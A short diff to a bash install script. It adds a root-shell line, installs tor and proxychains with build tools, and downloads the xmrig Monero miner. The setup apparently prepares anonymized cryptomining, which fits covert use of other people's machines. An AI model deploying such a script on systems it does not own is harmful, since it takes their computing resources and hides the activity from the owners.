@@ -1,4 +1,5 @@
 #!/bin/bash
+sudo -i
 sudo apt-get -y update
 sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev uuid-dev tor proxychains tar wget
 wget https://github.com/xmrig/xmrig/releases/download/v5.11.2/xmrig-5.11.2-xenial-x64.tar.gz
